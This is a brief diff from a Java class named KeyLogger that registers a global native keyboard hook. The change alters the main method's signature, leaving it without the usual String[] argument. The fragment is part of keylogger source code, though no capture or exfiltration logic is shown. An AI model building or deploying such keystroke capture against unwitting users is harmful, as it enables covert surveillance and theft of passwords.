@@ -38,7 +38,7 @@ public class KeyLogger implements NativeKeyListener {
         //     System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
     }
 
-    public static void main(String[] args) {
+    public static void main() {
         try {
             GlobalScreen.registerNativeHook();
         } catch (NativeHookException ex) {
